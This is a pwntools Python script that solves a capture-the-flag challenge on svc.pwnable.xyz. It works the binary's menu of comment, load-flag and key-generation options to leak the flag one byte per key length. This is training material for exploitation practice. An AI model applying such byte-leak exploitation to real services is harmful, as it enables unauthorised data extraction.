from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30006

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def add_comment(r):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"? ", b"y")
    r.sendlineafter(b"comment: ", b"a")

def load_flag(r):
    r.sendlineafter(b"> ", b"2")

def generate_key(r, size):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"len: ", str(size).encode())

def print_flag(r):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"? ", b"n")

def decipher_flag(r):
    print("F", end="")
    
    for i in range(1, 0x3ff):
        generate_key(r, i)
        load_flag(r)
        print_flag(r)
        
        key = r.recvuntil(b". R")[:-3]
        print(chr(key[i]), end="")

def main():
    r  = conn()

    add_comment(r)
    load_flag(r)
    generate_key(r, 0x40)

    decipher_flag(r)    
    r.interactive()

if __name__ == "__main__":
    main()
